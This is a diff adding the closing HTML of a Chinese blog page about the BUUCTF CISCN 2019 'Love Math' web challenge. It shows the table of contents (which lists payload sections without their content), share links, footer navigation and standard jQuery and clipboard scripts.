+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">基础分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">工具使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload1"><span class="toc-number">3.</span> <span class="toc-text">payload1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload2"><span class="toc-number">4.</span> <span class="toc-text">payload2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload3"><span class="toc-number">5.</span> <span class="toc-text">payload3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload4"><span class="toc-number">6.</span> <span class="toc-text">payload4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&text=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&title=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&is_video=false&description=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval&body=Check out this article: http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&title=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&title=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&title=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&title=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&name=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&t=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
